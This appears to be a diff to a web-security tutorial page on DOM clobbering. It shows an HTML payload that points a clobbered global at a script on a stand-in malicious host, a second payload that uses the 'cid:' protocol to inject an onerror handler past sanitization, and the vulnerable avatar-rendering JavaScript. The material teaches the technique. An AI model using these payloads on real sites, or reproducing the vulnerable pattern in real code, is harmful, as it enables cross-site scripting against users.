@@ -16,3 +16,12 @@ To exploit this vulnerable code, you could inject the following HTML to clobber 
 ```html
 <a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
 ```
+Another example using `cid` protocol to bypass sanitization:
+```html
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+```
+Vulnerable code:
+```js
+let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+```
